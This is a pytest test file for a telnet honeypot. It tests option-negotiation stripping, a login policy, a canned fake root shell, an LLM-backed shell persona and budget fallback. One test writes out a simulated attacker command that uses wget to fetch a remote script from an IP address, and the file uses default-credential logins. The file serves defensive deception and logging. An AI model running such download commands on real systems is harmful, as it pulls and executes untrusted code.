"""Telnet trap tests: IAC handling, login policy, canned shell, persona path and budgets."""

from __future__ import annotations

import asyncio
from types import SimpleNamespace

import pytest

from agents import hooks
from agents.budget import CANNED_INTERACTIVE, Budget, BudgetConfig
from listeners import telnet
from listeners.base import ListenerContext, ServiceSettings
from listeners.events import EventWriter
from scenarios.schema import LoginPolicy

IAC_JUNK = bytes([255, 251, 24, 255, 250, 24, 0, 120, 116, 101, 114, 109, 255, 240])


class FakeHistory:
    def __init__(self, replies: dict[str, str]) -> None:
        self.replies = replies
        self.calls: list[tuple[dict, dict]] = []

    async def ainvoke(self, input, config):
        self.calls.append((input, config))
        text = input["messages"][0].content
        return SimpleNamespace(content=self.replies.get(text, f"-bash: {text}: not found\n"))


@pytest.fixture(autouse=True)
def reset_hooks():
    hooks.reset()
    hooks.set_budget(Budget(BudgetConfig()))  # entry points always set one; fail closed otherwise
    yield
    hooks.reset()


@pytest.fixture
async def telnet_server():
    servers = []

    async def _start(persona=None, accept="after_n", persona_sessions=None):
        writer = EventWriter(None)
        ctx = ListenerContext(writer, bind_host="127.0.0.1", seed="test", persona_history=persona,
                              persona_sessions=persona_sessions)
        settings = ServiceSettings(name="telnet", enabled=True, port=0,
                                   policy=LoginPolicy(accept=accept, after_n_min=2, after_n_max=2))
        ctx.settings["telnet"] = settings
        objs = await telnet.start(ctx, settings)
        servers.extend(objs)
        reader, w = await asyncio.open_connection("127.0.0.1", objs[0].sockets[0].getsockname()[1])
        return writer, reader, w

    yield _start
    for s in servers:
        s.close()


async def read_until(reader, marker: bytes, timeout: float = 3.0) -> bytes:
    buf = b""
    while marker not in buf:
        chunk = await asyncio.wait_for(reader.read(4096), timeout)
        if not chunk:
            break
        buf += chunk
    return buf


async def login(reader, w, user: bytes, password: bytes) -> bytes:
    await read_until(reader, b"login: ")
    w.write(IAC_JUNK + user + b"\r\n")
    out = await read_until(reader, b"Password: ")
    assert bytes([255, 251, 1]) in out                       # IAC WILL ECHO before password
    w.write(password + b"\r\0")
    return out


def events(writer, event):
    return [e for e in writer.events if e["event"] == event]


async def test_telnet_fail_then_login_canned_shell(telnet_server):
    writer, reader, w = await telnet_server()
    await login(reader, w, b"admin", b"admin")
    assert b"Login incorrect" in await read_until(reader, b"Login incorrect")
    await login(reader, w, b"root", b"12345")
    banner = await read_until(reader, b"root@srv01:~# ")
    assert b"Welcome to" in banner
    w.write(b"whoami\r\n")
    assert b"root\r\n" in await read_until(reader, b":~# ")
    w.write(b"uname -a\r\n")
    assert b"Linux srv01" in await read_until(reader, b":~# ")
    w.write(b"wget http://198.51.100.7/x.sh\r\n")
    assert b"wget: command not found" in await read_until(reader, b":~# ")
    w.write(b"exit\r\n")
    assert (await read_until(reader, b"__never__")).endswith(b"logout\r\n")
    attempts = events(writer, "auth_attempt")
    assert [(a["username"], a["password"], a["success"]) for a in attempts] == [
        ("admin", "admin", False), ("root", "12345", True)]
    inputs = [e["data"]["input"] for e in events(writer, "command")]
    assert inputs == ["whoami", "uname -a", "wget http://198.51.100.7/x.sh", "exit"]


async def test_telnet_three_failures_close(telnet_server):
    writer, reader, w = await telnet_server(accept="none")
    for i in range(3):
        await login(reader, w, b"u%d" % i, b"p")
    tail = await read_until(reader, b"__never__")
    assert tail.count(b"Login incorrect") >= 1
    assert len(events(writer, "auth_attempt")) == 3


async def test_telnet_persona_path(telnet_server):
    fake = FakeHistory({"": "Last login: Mon Mar  2 09:14:01 2026\nroot@db01:~# ",
                        "id": "uid=0(root) gid=0(root) groups=0(root)\nroot@db01:~# ",
                        "logout": "YYY-END-OF-SESSION-YYY"})
    writer, reader, w = await telnet_server(persona=fake, accept="all")
    await login(reader, w, b"root", b"root")
    first = await read_until(reader, b"root@db01:~# ")
    assert b"Last login" in first and b"\r\n" in first
    w.write(b"id\r\n")
    assert b"uid=0(root)" in await read_until(reader, b"root@db01:~# ")
    w.write(b"logout\r\n")
    assert await read_until(reader, b"__never__") == b""     # closed, nothing written
    texts = [c[0]["messages"][0].content for c in fake.calls]
    assert texts == ["", "id", "logout"]
    assert fake.calls[1][1]["configurable"]["session_id"].startswith("telnet-")
    assert fake.calls[1][0]["username"] == "root"
    cmds = events(writer, "command")
    assert cmds[0]["data"]["input"] == "id" and "uid=0" in cmds[0]["data"]["response"]
    assert cmds[0]["data"]["persona"] is True


async def test_telnet_persona_history_freed_on_close(telnet_server):
    store: dict = {}

    class StoringHistory(FakeHistory):
        async def ainvoke(self, input, config):
            store.setdefault(config["configurable"]["session_id"], []).append(input)
            return await super().ainvoke(input, config)

    fake = StoringHistory({"": "root@db01:~# ", "logout": "YYY-END-OF-SESSION-YYY"})
    writer, reader, w = await telnet_server(persona=fake, accept="all", persona_sessions=store)
    await login(reader, w, b"root", b"root")
    await read_until(reader, b"root@db01:~# ")
    assert len(store) == 1
    w.write(b"logout\r\n")
    assert await read_until(reader, b"__never__") == b""
    for _ in range(50):
        if not store:
            break
        await asyncio.sleep(0.02)
    assert store == {}


async def test_telnet_budget_exhausted_uses_canned_without_model(telnet_server):
    hooks._budget = Budget(BudgetConfig(max_tokens_per_day=0))
    fake = FakeHistory({})
    writer, reader, w = await telnet_server(persona=fake, accept="all")
    await login(reader, w, b"root", b"root")
    out = await read_until(reader, b"__never__")
    assert CANNED_INTERACTIVE.encode() in out
    assert fake.calls == []
    assert any(e["data"].get("reason") == "budget" for e in events(writer, "limit"))


def test_iac_reader_strips_negotiation_across_chunks():
    class FakeConn:
        ctx = SimpleNamespace(limits=SimpleNamespace(max_line_bytes=4096))

    r = telnet.TelnetReader(FakeConn())  # type: ignore[arg-type]
    data = b"ro" + bytes([255]) + bytes([253, 1]) + b"o" + bytes([255, 250, 31, 0, 80]) \
        + bytes([255, 240]) + b"tx\x7f\r\n" + bytes([255, 255]) + b"\n"
    for i in range(len(data)):
        r.feed(data[i:i + 1])
    assert r.lines == [b"root", b"\xff"]


def test_missing_persona_prompt_file_falls_back_to_the_static_shell(tmp_path, monkeypatch):
    """A bad [llm] prompt_file must not stop the listener process; telnet keeps its
    canned shell instead of the model persona."""
    from configparser import ConfigParser

    from listeners.__main__ import build_context

    monkeypatch.setenv("ANTHROPIC_API_KEY", "test-key-not-used")
    cp = ConfigParser()
    cp["honeypot"] = {"log_file": str(tmp_path / "events.jsonl")}
    cp["scenario"] = {"seed": "0" * 64}
    cp["llm"] = {"llm_provider": "anthropic", "model_name": "m", "system_prompt": "s",
                 "prompt_file": str(tmp_path / "missing-prompt.txt")}
    cp["listeners"] = {"bind_host": "127.0.0.1", "quarantine_dir": str(tmp_path / "q"),
                       "llm": "true", "telnet_enabled": "true"}

    ctx = build_context(cp, tmp_path, None, data_dir=str(tmp_path / "data"))

    assert getattr(ctx, "persona_history", None) is None
